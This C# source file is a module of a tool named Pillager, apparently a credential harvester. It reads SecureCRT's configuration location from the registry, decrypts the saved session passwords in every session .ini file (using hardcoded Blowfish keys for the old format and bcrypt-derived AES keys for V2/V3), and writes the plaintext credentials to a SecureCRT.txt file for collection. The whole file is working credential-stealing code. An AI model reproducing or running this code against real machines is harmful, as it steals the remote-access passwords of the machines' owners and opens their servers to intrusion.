using Microsoft.Win32;
using Pillager.Helper;
using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Pillager.Tools
{
    internal class SecureCRT : ICommand
    {
        public string DecryptV2(string input, string passphrase = "")
        {
            try
            {
                if (!input.StartsWith("02") && !input.StartsWith("03")) return "";
                bool v3 = input.StartsWith("03");
                input = input.Substring(3);
                byte[] keyBytes = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(passphrase));
                byte[] iv = new byte[16];
                byte[] array = fromhex(input);
                if (v3)
                {
                    byte[] ciphertext_bytes = new byte[array.Length - 16];
                    byte[] salt = new byte[16];
                    Array.Copy(array, 0, salt, 0, 16);
                    Array.Copy(array, 16, ciphertext_bytes, 0, array.Length - 16);
                    array = ciphertext_bytes;

                    Bcrypt b = new Bcrypt();
                    var bytes = b.BcryptPbkdf("", salt, 16, 48);
                    keyBytes = new byte[32];
                    Array.Copy(bytes, 0, keyBytes, 0, 32);
                    Array.Copy(bytes, 32, iv, 0, 16);
                }

                byte[] decrypted;
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
                    {
                        rijndaelManaged.KeySize = 256;
                        rijndaelManaged.BlockSize = 128;
                        rijndaelManaged.Key = keyBytes;
                        rijndaelManaged.IV = iv;
                        rijndaelManaged.Mode = CipherMode.CBC;
                        rijndaelManaged.Padding = PaddingMode.Zeros;
                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cryptoStream.Write(array, 0, array.Length);
                            cryptoStream.Close();
                        }
                        decrypted = memoryStream.ToArray();
                    }
                }
                if (decrypted.Length < 4) return "";
                int num = BitConverter.ToInt32(new byte[4]
                {
                    decrypted[0],
                    decrypted[1],
                    decrypted[2],
                    decrypted[3]
                }, 0);
                if (decrypted.Length < 4 + num + 32) return "";

                byte[] array3 = new byte[num];
                byte[] array4 = new byte[32];
                byte[] a_ = new byte[32];
                Array.Copy(decrypted, 4, array3, 0, num);
                Array.Copy(decrypted, 4 + num, array4, 0, 32);
                using (SHA256 sHA = SHA256.Create())
                {
                    a_ = sHA.ComputeHash(array3);
                }
                if (a_.Length != array4.Length) return "";
                for (int i = 0; i < a_.Length; i++)
                {
                    if (a_[i] != array4[i])
                        return "";
                }
                return Encoding.UTF8.GetString(array3);
            }
            catch
            {
                return "";
            }
        }

        private byte[] fromhex(string hex)
        {
            byte[] mybyte = new byte[int.Parse(Math.Ceiling(hex.Length / 2.0).ToString())];
            for (int i = 0; i < mybyte.Length; i++)
            {
                int len = 2 <= hex.Length ? 2 : hex.Length;
                mybyte[i] = Convert.ToByte(hex.Substring(0, len), 16);
                hex = hex.Substring(len, hex.Length - len);
            }
            return mybyte;
        }

        public string Decrypt(string str)
        {
            byte[] IV = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
            byte[] Key1 = { 0x24, 0xa6, 0x3d, 0xde, 0x5b, 0xd3, 0xb3, 0x82, 0x9c, 0x7e, 0x06, 0xf4, 0x08, 0x16, 0xaa, 0x07 };
            byte[] Key2 = { 0x5f, 0xb0, 0x45, 0xa2, 0x94, 0x17, 0xd9, 0x16, 0xc6, 0xc6, 0xa2, 0xff, 0x06, 0x41, 0x82, 0xb7 };
            byte[] ciphered_bytes = fromhex(str);
            if (ciphered_bytes.Length <= 8) return null;

            Blowfish algo = new Blowfish();
            algo.InitializeKey(Key1);
            algo.SetIV(IV);
            byte[] decryptedTxt = new byte[ciphered_bytes.Length];
            algo.DecryptCBC(ciphered_bytes, 0, ciphered_bytes.Length, decryptedTxt, 0);
            decryptedTxt = decryptedTxt.Skip(4).Take(decryptedTxt.Length - 8).ToArray();

            algo = new Blowfish();
            algo.InitializeKey(Key2);
            algo.SetIV(IV);
            algo.DecryptCBC(decryptedTxt, 0, decryptedTxt.Length, ciphered_bytes, 0);
            string ciphered = Encoding.Unicode.GetString(ciphered_bytes).Split('\0')[0];
            return ciphered;
        }

        public string GetInfo()
        {
            StringBuilder sb = new StringBuilder();
            string name = "Software\\VanDyke\\SecureCRT";
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
            if (registryKey == null) return "";
            string path = Path.Combine(registryKey.GetValue("Config Path").ToString(), "Sessions");
            if (Directory.Exists(path))
            {
                FileInfo[] files = new DirectoryInfo(path).GetFiles("*.ini", SearchOption.AllDirectories);
                foreach (FileInfo fileInfo in files)
                {
                    if (fileInfo.Name.ToLower().Equals("__FolderData__.ini".ToLower())) continue;
                    foreach (string line in File.ReadAllLines(fileInfo.FullName))
                    {
                        if (line.IndexOf('=') != -1)
                        {
                            string text3 = line.Split('=')[0];
                            string a_2 = line.Split('=')[1];
                            if (text3.ToLower().Contains("S:\"Password\"".ToLower()))
                            {
                                sb.AppendLine("S:\"Password\"=" + Decrypt(a_2));
                            }
                            else if (text3.ToLower().Contains("S:\"Password V2\"".ToLower()))
                            {
                                sb.AppendLine("S:\"Password V2\"=" + DecryptV2(a_2));
                            }
                            else
                            {
                                sb.AppendLine(line);
                            }
                        }
                    }
                }
            }

            return sb.ToString();
        }

        public override void Save(string path)
        {
            try
            {
                string output = GetInfo();
                if (string.IsNullOrEmpty(output)) return;
                string savepath = Path.Combine(path, "SecureCRT");
                Directory.CreateDirectory(savepath);
                File.WriteAllText(Path.Combine(savepath, "SecureCRT.txt"), output, Encoding.UTF8);
            }
            catch { }
        }
    }
}
